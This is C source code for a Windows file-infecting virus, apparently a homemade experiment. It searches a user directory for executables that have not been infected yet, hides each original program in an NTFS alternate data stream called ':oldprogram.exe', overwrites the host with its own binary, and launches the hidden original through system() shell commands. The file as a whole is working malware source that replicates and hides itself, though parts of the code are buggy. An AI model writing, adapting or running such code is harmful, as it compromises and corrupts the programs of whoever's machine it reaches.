#include <stdio.h>
#include <windows.h>
#include <string.h>

char lastInfectedFile[MAX_PATH] = ".inputrc";


int fileNotInfected(char* ads){

	
	char* adspath = (char*) malloc (MAX_PATH*sizeof(char));

	strcpy(adspath, ads);
	strcat(adspath,":oldprogram.exe");
	
	HANDLE hFile = CreateFile(adspath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return 1;
	}
	else
	{
		CloseHandle(hFile);
		return 0;
	}
	
	return 0;
}


char* getFile(char directory[])
{
	char path1[MAX_PATH];
	char path2[MAX_PATH];
	
	strcpy(path1, directory); 
	strcpy(path2, directory);

	char* returnString = (char*) malloc (MAX_PATH*sizeof(char));  
	
	strcpy(returnString, "empty");
	
	WIN32_FIND_DATA findFileData;
	HANDLE hFind = FindFirstFile(strcat(path2, "\\*"), &findFileData);
	char execheck[] = ".exe" ;
	
	do{

		if( strstr(findFileData.cFileName, execheck) != NULL)
		{
			char* ads = (char*)malloc(MAX_PATH*sizeof(char));
			strcat(ads, path1);
			strcat(ads,"\\");
			strcat(ads,findFileData.cFileName);
			
			if(fileNotInfected(ads))
			{
				strcpy(returnString, findFileData.cFileName);
				break;
			}			
				
	}


	}while(FindNextFile(hFind, &findFileData) != 0);
	
	strcpy(directory, path1);
	FindClose(hFind);
	return returnString;
}

int copyandexecute(char* directory, char* file, char* infectedfile)
{
	
	printf("The directory is %s\n\n", directory);
	printf("The file is %s\n\n", file);
	printf("The infected file is %s\n\n", infectedfile);



	char* cmd1 = (char*) malloc (sizeof(char)*500);
	char* cmd2 = (char*) malloc (sizeof(char)*500);
	char* cmd3 = (char*) malloc (sizeof(char)*500);
	char* cmd4 = (char*) malloc (sizeof(char)*500);
	char* cmd5 = (char*) malloc (sizeof(char)*500);
	char* cmd6 = (char*) malloc (sizeof(char)*500);

	strcpy(cmd1, "cmd /c 'copy ");
	strcat(cmd1,  directory);
	strcat(cmd1, "\\");
	strcat(cmd1, file);
	strcat(cmd1, " ");
	strcat(cmd1, directory);
	strcat(cmd1, "\\");
	strcat(cmd1, "tmp.exe'");

	printf("%s\n\n",cmd1);	
	system(cmd1);

	strcpy(cmd2,"cmd /c 'copy ");
	strcat(cmd2, infectedfile);
	strcat(cmd2,".exe");
	strcat(cmd2, " ");
	strcat(cmd2, directory);
	strcat(cmd2, "\\");
	strcat(cmd2, file);
	strcat(cmd2, " '");
	
	printf("%s\n\n",cmd2);
	system(cmd2);
	
	strcat(cmd3, "cmd /c 'type ");
	strcat(cmd3, directory);
	strcat(cmd3, "\\");
	strcat(cmd3, "tmp.exe > ");
	strcat(cmd3, directory);
	strcat(cmd3,"\\");
	strcat(cmd3, file);
	strcat(cmd3, ":oldprogram.exe'");
	
	printf("%s\n\n",cmd3);
	system(cmd3);
	
	strcpy(cmd4, "cmd /c 'rm ");
	strcat(cmd4, directory);
	strcat(cmd4, "\\");
	strcat(cmd4, "tmp.exe");
	strcat(cmd4, "'");
	
	printf("%s\n\n",cmd4);
	system(cmd4);



	strcpy(cmd5, "cmd /c 'start ");
	strcat(cmd5, directory);
	strcat(cmd5, "\\");
	strcat(cmd5, infectedfile);
	strcat(cmd5,".exe");
	strcat(cmd5, ":oldprogram.exe'");
	
	printf("%s\n\n",cmd5);

	if(!fileNotInfected(strcat(infectedfile,".exe:oldprogram.exe")))
	{
	system(cmd5);
	}
	

	return 0;
	
}


int modifyfile( char* fileToInfect)
{

	FILE *file;
	
	file = fopen(fileToInfect, "ab");

    if (file == NULL) {
        perror("Error opening file");
        return 1;
    }

    // NOP opcode for x86 and x86-64 architecture
    char nop_opcode[] = {0x90};

    // Write the NOP opcode to the end of the file
    fwrite(nop_opcode, sizeof(char), sizeof(nop_opcode) / sizeof(char), file);

    // Close the file
    fclose(file);

    return 0;

}



int main(int argc, char* argv[] )
{
	char startDirectory[MAX_PATH] = "C:\\cygwin\\home\\administrator";

	char currentfile[MAX_PATH];
	
	char *executableName = basename(argv[0]);

	strcpy(currentfile, executableName);
	
	//printf("%s",ListFilesAndFolders( startDirectory, 1, currentfile));
	
	//printf("%s",getFile(startDirectory));
	
	char fileToInfect[MAX_PATH] = "";
	
	strcpy(fileToInfect, getFile(startDirectory));

	char fullFilePath[MAX_PATH] = "";
		
	copyandexecute(startDirectory, fileToInfect, currentfile);


	strcpy(fullFilePath, startDirectory);
	strcat(fullFilePath, "\\");
	strcat(fullFilePath, fileToInfect);

	modifyfile(fullFilePath);

	return 0;

}
